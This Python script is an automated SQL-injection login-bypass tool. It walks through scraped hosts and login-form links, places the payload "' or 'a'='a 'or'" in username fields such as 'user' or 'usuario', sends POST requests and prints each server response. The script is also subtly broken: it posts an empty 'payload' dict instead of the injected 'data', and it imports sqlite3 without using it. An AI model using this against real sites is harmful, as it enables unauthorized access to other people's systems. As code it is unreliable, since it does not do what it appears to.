import sqlite3
import requests
from web_scraping import get_hosts_links


def inject_sql():
    host_action_names_values = get_hosts_links()

    for host, action_names_values in host_action_names_values.items():
        for item in action_names_values:
            payload = {}
            link = ''

            if isinstance(item, dict):
                for name in item['names_values'].keys():
                    if any(p_name in name for p_name in ['user', 'usuario']):
                        item['names_values'][name] = "' or 'a'='a 'or'"
                        data = item['names_values']
                        link = item['action']
            elif isinstance(item, str):
                data={'usuario':"' or 'a'='a 'or'", 'password':''}
                link = item

            url = f'http://{host}/{link}/'

            try:
                with requests.Session() as s:
                    response = s.post(url, data=payload)
            except:
                print('#######################################################')
                print(f'There was a problem when trying to login to {url}')
                print('#######################################################')
                continue

            if response.status_code == requests.codes.ok:
                print('#######################################################')
                print(response.text)
                print('#######################################################')
            else:
                print('#######################################################')
                print(response.text)
                print('#######################################################')


if __name__ == '__main__':
    inject_sql()